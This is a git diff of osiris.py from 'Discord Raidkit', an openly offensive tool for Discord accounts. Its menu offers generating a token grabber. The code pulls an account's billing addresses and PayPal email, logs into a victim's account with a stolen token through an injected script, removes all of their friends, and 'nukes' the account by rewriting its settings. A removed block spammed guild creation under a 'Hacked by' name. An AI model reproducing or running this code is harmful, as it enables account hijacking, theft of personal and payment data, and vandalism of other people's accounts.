@@ -8,34 +8,57 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 osiris.py stores the Osiris program for Discord Raidkit.
-osiris.py was last updated on 05/03/23 at 23:19 UTC.
+osiris.py was last updated on 21/04/23 at 01:53 UTC.
 """
 
-import asyncio
-import logging
 import os
+from abc import ABC, abstractmethod
 from time import sleep
 
-import httpx
 import requests
-from colorama import Fore, init
+from colorama import Fore
 from selenium import webdriver
 from selenium.common.exceptions import WebDriverException
 from selenium.webdriver import ActionChains
 from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import WebDriverWait
+from webdriver_manager.chrome import ChromeDriverManager
+from webdriver_manager.firefox import GeckoDriverManager
+from webdriver_manager.microsoft import EdgeChromiumDriverManager
 
-from utils import clear_screen, init_logger, repeat_prompt_until_valid_input
+import utils.log_utils as lu
+from utils.io_utils import valid_input
 
-LOGIN_ACTION_NONE = 0
-LOGIN_ACTION_REMOVE_FRIENDS = 1
+lu.init()
 
-init()
-init_logger()
+class LoginAction(ABC):
+    @abstractmethod
+    def execute(self, driver) -> str:
+        pass
+
+
+class LoginActionNone(LoginAction):
+    def execute(self, driver) -> str:
+        return 'Logged into user account successfully'
+
+
+class LoginActionRemoveFriends(LoginAction):
+    def execute(self, driver) -> str:
+        driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
+        people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
+        action = ActionChains(driver)
+        for person in people:
+            action.context_click(person).perform()
+            driver.find_element(By.ID, 'user-context-remove-friend').click()
+            driver.find_element(By.XPATH, "//button[@type='submit']").click()
+            sleep(0.5)
+        return 'Removed all friends from user account successfully'
 
 
 class Osiris:
     
-    __slots__ = ['auth', 'hint']
+    __slots__ = ('auth', 'hint')
     
     def __init__(self) -> None:
         self.auth = ''
@@ -44,7 +67,7 @@ class Osiris:
 
     def run(self) -> None:
         while True:
-            match repeat_prompt_until_valid_input(f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's Osiris!
+            match valid_input(f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's Osiris!
 
 {Fore.LIGHTBLUE_EX}[1] Generate Discord token grabber
 [2] Get a Discord account's details
@@ -55,9 +78,9 @@ class Osiris:
 
 {Fore.LIGHTWHITE_EX}{self.hint}
 
-{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}""", '123456'):
+{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}""", {'1', '2', '3', '4', '5', '6'}, True):
                 case '1':
-                    clear_screen()
+                    os.system('cls' if os.name == 'nt' else 'clear')
                     self.hint = self.generate_grabber() 
                 case '2':
                     print('Enter a user authentication token: ', end='')
@@ -66,17 +89,17 @@ class Osiris:
                 case '3':
                     print('Enter a user authentication token: ', end='')
                     self.auth = input()
-                    self.hint = self.login(LOGIN_ACTION_NONE)
+                    self.hint = self.login(LoginActionNone())
                 case '4':
                     print('Enter a user authentication token: ', end='')
                     self.auth = input()
-                    self.hint = self.login(LOGIN_ACTION_REMOVE_FRIENDS)
+                    self.hint = self.login(LoginActionRemoveFriends())
                 case '5':
                     print('Enter a user authentication token: ', end='')
                     self.auth = input()
                     self.hint = self.nuke_account()
                 case '6':
-                    clear_screen()
+                    os.system('cls' if os.name == 'nt' else 'clear')
                     break 
 
     @staticmethod
@@ -239,7 +262,7 @@ if __name__ == "__main__":
             return 'Successfully generated payload!'
 
         except Exception as e:
-            logging.error(f'Error in osiris.py - generate_grabber(): {e}')
+            lu.serror(lu.F_OSIRIS, 'Osiris.generate_grabber', f'Uncaught error: {e}')
             return f'Error in osiris.py - generate_grabber(): {e}'
 
     def get_account_info(self) -> str:
@@ -270,7 +293,7 @@ if __name__ == "__main__":
             if bool(bill_sources_response):
                 info += f'\n\nBilling Information\n{"*"*19}\n\n'
                 for source_data in bill_sources_response:
-                    info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}'
+                    info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
                     
                     match source_data['type']:
                         case 1:
@@ -285,14 +308,14 @@ if __name__ == "__main__":
                             info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                             info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
                         case 2:
-                            info += f'[PayPal Email]{" "*6}{source_data["email"]}'
+                            info += f'[PayPal Email]{" "*6}{source_data["email"]}\n'
                             info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                             info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                             info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                             info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                             info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                             info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
-                            info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
+                            info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                         case _:
                             info += 'None'
                 info += f'\n[Token]{" "*13}{self.auth}'
@@ -311,16 +334,44 @@ if __name__ == "__main__":
             return True, r
         return False, False
 
-    def login(self, login_action: int = 0) -> str:
+    def login(self, login_action: LoginAction) -> str:
         try:
             if self.check_auth()[0]:
-                webdriver.ChromeOptions.binary_location = os.path.join(
-                    'browser', 'chrome.exe')
-                opts = webdriver.ChromeOptions()
-                opts.add_experimental_option('detach', True)
-                driver = webdriver.Chrome(
-                    executable_path=os.path.join('browser', 'chromedriver.exe'), options=opts)
-                driver.implicitly_wait(10)
+                browser = valid_input('''Enter a compatible browser: 
+
+[1] Chrome
+[2] Firefox
+[3] Edge
+[4] Cancel
+
+>>> ''', {'1', '2', '3', '4'}, True)
+                match browser:
+                    case '1':
+                        from selenium.webdriver.chrome.options import Options
+                        chrome_options = Options()
+                        chrome_options.add_experimental_option('detach', True)
+                        chrome_options.add_argument('--log-level=3')
+                        driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=chrome_options)
+                    case '2':
+                        from selenium.webdriver.firefox.options import Options
+                        firefox_options = Options()
+                        firefox_options.set_preference('detach', True)
+                        firefox_options.add_argument('--log-level=3')
+                        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install(), options=firefox_options)
+                    case '3':
+                        from selenium.webdriver.edge.options import Options
+                        edge_options = Options()
+                        edge_options.add_experimental_option('detach', True)
+                        edge_options.add_argument('--log-level=3')
+                        driver = webdriver.Edge(executable_path=EdgeChromiumDriverManager().install(), options=edge_options)
+                    case '4':
+                        return ''
+
+                driver.implicitly_wait(30)
+                driver.get('https://discord.com/login')
+                
+                WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//h1[contains(text(),'Welcome back!')]")))
+                
                 script = """
                             function login(token) {
                             setInterval(() => {
@@ -331,47 +382,22 @@ if __name__ == "__main__":
                             }, 2500);
                             }
                             """
-                driver.get('https://discord.com/login')
                 driver.execute_script(script + f'\nlogin("{self.auth}")')
 
-                if login_action == LOGIN_ACTION_NONE:
-                    return 'Logged into user account successfully'
-
-                elif login_action == LOGIN_ACTION_REMOVE_FRIENDS:
-                    driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
-                    people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
-                    action = ActionChains(driver)
-                    for person in people:
-                        action.context_click(person).perform()
-                        driver.find_element(By.ID, 'user-context-remove-friend').click()
-                        driver.find_element(By.XPATH, "//button[@type='submit']").click()
-                        sleep(0.5)
-                    driver.close()
-                    return 'Removed all friends from user account successfully'
-                else:
-                    return 'Invalid login action!'
+                return login_action.execute(driver)
             else:
                 return 'User authentication token is not valid!'
         except WebDriverException as e:
-            return f"Osiris's browser folder was not found. {e}"
+            lu.serror(lu.F_OSIRIS, 'Osiris.login', f"WebDriver Exception: {e}")
+            return f"WebDriverException: {e}"
         except Exception as e:
-            logging.error(f'Error in osiris.py - login(): {e}')
+            lu.serror(lu.F_OSIRIS, 'Osiris.login', f'Uncaught error: {e}')
             return f'Error in osiris.py - login(): {e}'
 
     def nuke_account(self) -> str:
 
-        async def nuke_requests(d_headers: dict) -> None:
-            payload = {
-                "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
-                "region": "europe",
-                "icon": None,
-                "channels": None
-            }
+        def nuke_request(headers) -> None:
             
-            async with httpx.AsyncClient() as client:
-                tasks = [client.post("https://discord.com/api/v6/guilds", headers=d_headers, json=payload) for _ in range(200)]
-                await asyncio.gather(*tasks, return_exceptions=True)
-
             settings = {
                 "locale": "ja",
                 "show_current_game": False,
@@ -395,8 +421,8 @@ if __name__ == "__main__":
             }
 
             requests.patch(
-                "https://discord.com/api/v8/users/@me/settings",
-                headers=d_headers,
+                "https://discord.com/api/v10/users/@me/settings",
+                headers=headers,
                 json=settings
             )
 
@@ -404,22 +430,16 @@ if __name__ == "__main__":
             if self.check_auth()[0]:
                 print('\nNuking account... this may take a while...')
 
-                # Attempt to get IDs of guilds from settings response (used to make account leave every guild,
-                # usually fails thanks to nerf).
-
                 headers = {
-                    "Authorization": self.auth,
-                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
-                                  "Chrome/50.0.2661.75 Safari/537.36",
-                    "X-Requested-With": "XMLHttpRequest"
+                    "Authorization": f"{self.auth}",
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Content-Type": "application/json"
                 }
-
-                url = "https://discord.com/api/v8/users/@me/settings"
-                _ = requests.get(url, headers=headers)
-                asyncio.run(nuke_requests(headers))
+                nuke_request(headers)
                 return 'User nuked successfully'
             else:
                 return 'User authentication token is not valid!'
         except Exception as e:
-            logging.error(f'Error in osiris.py - nuke_account(): {e}')
+            lu.serror(lu.F_OSIRIS, 'Osiris.nuke_account', f'Uncaught error: {e}')
             return f'Error in osiris.py - nuke_account(): {e}'
